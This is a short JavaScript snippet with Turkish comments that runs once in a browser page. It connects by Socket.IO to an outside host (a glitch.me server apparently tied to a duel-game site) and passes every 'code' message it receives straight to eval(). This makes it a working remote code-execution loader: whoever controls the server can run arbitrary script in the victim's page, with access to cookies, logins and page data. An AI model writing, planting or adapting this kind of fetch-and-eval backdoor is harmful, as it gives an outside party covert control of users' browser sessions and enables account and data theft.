(function() {
    // Script’in tekrar çalışmasını engelle
    if (window.mySocket) {
        console.log('Script zaten yüklü, tekrar çalıştırılmadı', 'Zaman:', new Date().toISOString());
        return;
    }

    console.log('Script yüklendi!', 'Zaman:', new Date().toISOString());
    
    var socket = io('https://duello-katiponline-com.glitch.me', {
        path: '/socket.io',
        transports: ['websocket'],
        query: { EIO: 4 },
        reconnection: true, // Otomatik yeniden bağlanma açık
        reconnectionAttempts: 5, // Maksimum 5 deneme
        reconnectionDelay: 2000 // 2 saniye ara
    });

    socket.on('connect', () => {
        console.log('Socket.IO bağlantısı kuruldu', 'ID:', socket.id, 'Zaman:', new Date().toISOString());
    });

    socket.on('code', (newCode) => {
        console.log('Yeni kod alındı:', newCode, 'Zaman:', new Date().toISOString());
        try {
            eval(newCode);
        } catch (e) {
            console.error('Kod çalıştırma hatası:', e.message, 'Zaman:', new Date().toISOString());
        }
    });

    socket.on('reconnect', (attempt) => {
        console.log('Yeniden bağlanma başarılı, Deneme:', attempt, 'ID:', socket.id, 'Zaman:', new Date().toISOString());
    });

    socket.on('reconnect_attempt', (attempt) => {
        console.log('Yeniden bağlanma deneniyor, Deneme:', attempt, 'Zaman:', new Date().toISOString());
    });

    socket.on('disconnect', (reason) => {
        console.log('Bağlantı koptu, Sebep:', reason, 'Zaman:', new Date().toISOString());
    });

    socket.on('connect_error', (error) => {
        console.error('Bağlantı hatası:', error.message, 'Zaman:', new Date().toISOString());
    });

    window.mySocket = socket; // Socket’i global olarak sakla
})();
